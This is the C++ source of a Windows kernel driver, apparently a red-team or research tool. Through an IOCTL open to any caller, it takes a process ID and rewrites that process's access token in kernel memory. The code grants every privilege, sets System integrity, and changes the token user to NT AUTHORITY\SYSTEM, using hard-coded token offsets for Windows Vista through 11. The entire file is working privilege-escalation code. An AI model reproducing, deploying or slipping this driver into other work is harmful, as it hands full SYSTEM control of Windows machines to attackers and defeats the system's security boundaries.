#include <ntifs.h>

#define DRIVER_PREFIX "GetFullPrivsDrv: "
#define DEVICE_PATH L"\\Device\\GetFullPrivs"
#define SYMLINK_PATH L"\\??\\GetFullPrivs"

#define VALID_PRIVILEGE_MASK 0x0000001FFFFFFFFCULL

//
// Global Variables
//
ULONG g_PrivilegesOffset = 0u;
ULONG g_UserAndGroupCountOffset = 0u;
ULONG g_UserAndGroupsOffset = 0u;
ULONG g_TokenFlagsOffset = 0u;
ULONG g_IntegrityLevelIndexOffset = 0u;

//
// Enum definition
//

// See: https://microsoft.github.io/windows-docs-rs/doc/windows/Wdk/Storage/FileSystem/constant.TOKEN_IS_FILTERED.html?search=windows%3A%3AWdk%3A%3AStorage%3A%3AFileSystem%3A%3ATOKEN_
typedef enum _TOKEN_FLAGS
{
	HasTraversePrivilege = 0x00000001,
	HasBackupPrivilege = 0x00000002,
	HasRestorePrivilege = 0x00000004,
	WriteRestricted = 0x00000008,
	IsRestricted = 0x00000010,
	SessionNotReferenced = 0x00000020,
	SandBoxInert = 0x00000040,
	HasImpersonatePrivilege = 0x00000080,
	BackupPrivilegesChecked = 0x00000100,
	VirtualizeAllowed = 0x00000200,
	VirtualizeEnabled = 0x00000400,
	IsFiltered = 0x00000800,
	UiAccess = 0x00001000,
	NotLow = 0x00002000,
	LowBox = 0x00004000,
	HasOwnClaimAttributes = 0x00008000,
	PrivateNamespace = 0x00010000,
	DoNotUseGlobalAttributesForQuery = 0x00020000,
	SpecialEncryptedOpen = 0x00040000,
	NoChildProcess = 0x00080000,
	NoChildProcessUnlessSecure = 0x00100000,
	AuditNoChildProcess = 0x00200000,
	PermissiveLearningMode = 0x00400000,
	EnforceRedirectionTrust = 0x00800000,
	AuditRedirectionTrust = 0x01000000
} TOKEN_FLAGS;

//
// Struct definition
//
typedef struct _SEP_TOKEN_PRIVILEGES
{
	ULONGLONG Present;
	ULONGLONG Enabled;
	ULONGLONG EnabledByDefault;
} SEP_TOKEN_PRIVILEGES, *PSEP_TOKEN_PRIVILEGES;

//
// Ioctl code definition
//
#define IOCTL_GET_ALL_PRIVS CTL_CODE(0x8000, 0x0200, METHOD_BUFFERED, FILE_ANY_ACCESS)

//
// Prototypes
//
void DriverUnload(_In_ PDRIVER_OBJECT DriverObject);
NTSTATUS OnCreateClose(
	_Inout_ PDEVICE_OBJECT DeviceObject,
	_Inout_ PIRP Irp
);
NTSTATUS OnDeviceControl(
	_Inout_ PDEVICE_OBJECT DeviceObject,
	_Inout_ PIRP Irp
);


//
// Driver routines
//
extern "C"
NTSTATUS DriverEntry(
	_In_ PDRIVER_OBJECT  DriverObject,
	_In_ PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(RegistryPath);

	NTSTATUS ntstatus = STATUS_FAILED_DRIVER_ENTRY;
	PDEVICE_OBJECT pDeviceObject = nullptr;

#ifndef _WIN64
	KdPrint((DRIVER_PREFIX "32bit OS is not supported.\n"));
	return STATUS_NOT_SUPPORTED;
#endif

	do
	{
		RTL_OSVERSIONINFOW versionInfo{ 0 };
		UNICODE_STRING devicePath = RTL_CONSTANT_STRING(DEVICE_PATH);
		UNICODE_STRING symlinkPath = RTL_CONSTANT_STRING(SYMLINK_PATH);

		ntstatus = ::RtlGetVersion(&versionInfo);

		if (!NT_SUCCESS(ntstatus))
		{
			KdPrint((DRIVER_PREFIX "Failed to get OS version information (NTSTATUS = 0x%08X).\n", ntstatus));
			break;
		}
		else
		{
			KdPrint((DRIVER_PREFIX "OS Version - %u.%u.%u\n",
				versionInfo.dwMajorVersion,
				versionInfo.dwMinorVersion,
				versionInfo.dwBuildNumber));

			// _SEP_TOKEN_PRIVILEGES was introduced since Windows Vista
			if ((versionInfo.dwMajorVersion == 6))
			{
				if (versionInfo.dwMinorVersion < 2)
				{
					// From Windows Vista to Windows 7 SP1
					g_PrivilegesOffset = 0x40u;
					g_UserAndGroupCountOffset = 0x78u;
					g_UserAndGroupsOffset = 0x90u;
					g_TokenFlagsOffset = 0xC0u;
					g_IntegrityLevelIndexOffset = 0xC8u;
				}
				else
				{
					// From Windows 8 to Windows 8.1
					g_PrivilegesOffset = 0x40u;
					g_UserAndGroupCountOffset = 0x7Cu;
					g_UserAndGroupsOffset = 0x98u;
					g_TokenFlagsOffset = 0xC8u;
					g_IntegrityLevelIndexOffset = 0xD0u;
				}
			}
			else if (versionInfo.dwMajorVersion == 10)
			{
				// From Windows 10 1509 to Windows 11 23H2
				g_PrivilegesOffset = 0x40u;
				g_UserAndGroupCountOffset = 0x7Cu;
				g_UserAndGroupsOffset = 0x98u;
				g_TokenFlagsOffset = 0xC8u;
				g_IntegrityLevelIndexOffset = 0xD0u;
			}
			else
			{
				// Older than Windows Vista does not have _SEP_TOKEN_PRIVILEGE
				ntstatus = STATUS_NOT_SUPPORTED;
				KdPrint((DRIVER_PREFIX "Unsupported OS version is detected.\n"));
				break;
			}

		}

		ntstatus = ::IoCreateDevice(
			DriverObject,
			NULL,
			&devicePath,
			FILE_DEVICE_UNKNOWN,
			NULL,
			FALSE,
			&pDeviceObject);

		if (!NT_SUCCESS(ntstatus))
		{
			pDeviceObject = nullptr;
			KdPrint((DRIVER_PREFIX "Failed to create device (NTSTATUS = 0x%08X).\n", ntstatus));
			break;
		}

		ntstatus = ::IoCreateSymbolicLink(&symlinkPath, &devicePath);

		if (!NT_SUCCESS(ntstatus))
		{
			KdPrint((DRIVER_PREFIX "Failed to create symbolic link (NTSTATUS = 0x%08X).\n", ntstatus));
			break;
		}

		DriverObject->DriverUnload = DriverUnload;
		DriverObject->MajorFunction[IRP_MJ_CREATE] = OnCreateClose;
		DriverObject->MajorFunction[IRP_MJ_CLOSE] = OnCreateClose;
		DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = OnDeviceControl;

		KdPrint((DRIVER_PREFIX "Driver is loaded successfully.\n"));
	} while (false);

	if (!NT_SUCCESS(ntstatus) && (pDeviceObject != nullptr))
		::IoDeleteDevice(pDeviceObject);

	return ntstatus;
}


void DriverUnload(_In_ PDRIVER_OBJECT DriverObject)
{
	UNICODE_STRING symlinkPath = RTL_CONSTANT_STRING(SYMLINK_PATH);
	::IoDeleteSymbolicLink(&symlinkPath);
	::IoDeleteDevice(DriverObject->DeviceObject);

	KdPrint((DRIVER_PREFIX "Driver is unloaded.\n"));
}


NTSTATUS OnCreateClose(
	_Inout_ PDEVICE_OBJECT DeviceObject,
	_Inout_ PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);

	NTSTATUS ntstatus = STATUS_SUCCESS;
	Irp->IoStatus.Status = ntstatus;
	Irp->IoStatus.Information = 0u;
	IoCompleteRequest(Irp, 0);

	return ntstatus;
}


NTSTATUS OnDeviceControl(
	_Inout_ PDEVICE_OBJECT DeviceObject,
	_Inout_ PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);

	NTSTATUS ntstatus = STATUS_INVALID_DEVICE_REQUEST;
	ULONG_PTR info = NULL;
	PIO_STACK_LOCATION irpSp = ::IoGetCurrentIrpStackLocation(Irp);
	auto& dic = irpSp->Parameters.DeviceIoControl;

	switch (dic.IoControlCode)
	{
	case IOCTL_GET_ALL_PRIVS:
		if (dic.InputBufferLength < sizeof(ULONG))
		{
			ntstatus = STATUS_BUFFER_TOO_SMALL;
			KdPrint((DRIVER_PREFIX "Input buffer is too small.\n"));
			break;
		}

		PEPROCESS pEprocess = nullptr;
		auto pid = ::ULongToHandle(*(ULONG*)Irp->AssociatedIrp.SystemBuffer);

		ntstatus = ::PsLookupProcessByProcessId(pid, &pEprocess);

		if (!NT_SUCCESS(ntstatus))
		{
			KdPrint((DRIVER_PREFIX "Failed to PsLookupProcessByProcessId() (NTSTATUS = 0x%08X).\n", ntstatus));
			break;
		}
		else
		{
			PACCESS_TOKEN pPrimaryToken = ::PsReferencePrimaryToken(pEprocess);
			auto pSepToken = (PSEP_TOKEN_PRIVILEGES)((ULONG_PTR)pPrimaryToken + g_PrivilegesOffset);
			auto nUserAndGroupCount = *(ULONG*)((ULONG_PTR)pPrimaryToken + g_UserAndGroupCountOffset);
			auto pUserAndGroups = *(PSID_AND_ATTRIBUTES*)((ULONG_PTR)pPrimaryToken + g_UserAndGroupsOffset);
			auto nIntegrityLevelIndex = *(ULONG*)((ULONG_PTR)pPrimaryToken + g_IntegrityLevelIndexOffset);

			KdPrint((DRIVER_PREFIX "Primary token for PID %u is at %p.\n", ::HandleToULong(pid), pPrimaryToken));
			KdPrint((DRIVER_PREFIX "_SEP_TOKEN_PRIVILEGES for PID %u is at %p.\n", ::HandleToULong(pid), pSepToken));

			pSepToken->Present = VALID_PRIVILEGE_MASK;
			pSepToken->Enabled = VALID_PRIVILEGE_MASK;
			pSepToken->EnabledByDefault = VALID_PRIVILEGE_MASK;

			KdPrint((DRIVER_PREFIX "_SEP_TOKEN_PRIVILEGES for PID %u is overwritten successfully.\n", HandleToULong(pid)));

			// Overwrite Integrity Level to System level
			auto pSid = (PISID)pUserAndGroups[nIntegrityLevelIndex].Sid;
			pSid->SubAuthority[0] = 0x4000;

			KdPrint((DRIVER_PREFIX "Integrity level of PID %u is modified to System level.\n", HandleToULong(pid)));

			for (auto idx = 0u; idx < nUserAndGroupCount; idx++)
			{
				// Overwrite token user to "NT AUTHORITY\SYSTEM"
				if (pUserAndGroups[idx].Attributes == 0)
				{
					pSid = (PISID)pUserAndGroups[idx].Sid;

					for (auto offset = 1; offset < pSid->SubAuthorityCount; offset++)
						pSid->SubAuthority[offset] = 0;

					pSid->SubAuthorityCount = 1;
					pSid->IdentifierAuthority.Value[0] = 0;
					pSid->IdentifierAuthority.Value[1] = 0;
					pSid->IdentifierAuthority.Value[2] = 0;
					pSid->IdentifierAuthority.Value[3] = 0;
					pSid->IdentifierAuthority.Value[4] = 0;
					pSid->IdentifierAuthority.Value[5] = 5;
					pSid->SubAuthority[0] = 18;

					KdPrint((DRIVER_PREFIX "Token user of PID %u is modified to \"NT AUTHORITY\\SYSTEM\".\n", HandleToULong(pid)));
					break;
				}
			}

			*(ULONG*)((ULONG_PTR)pPrimaryToken + g_TokenFlagsOffset) = IsFiltered | NotLow;

			::PsDereferencePrimaryToken(pPrimaryToken);
			ObDereferenceObject(pEprocess);
		}
	}

	Irp->IoStatus.Status = ntstatus;
	Irp->IoStatus.Information = info;
	IoCompleteRequest(Irp, 0);

	return ntstatus;
}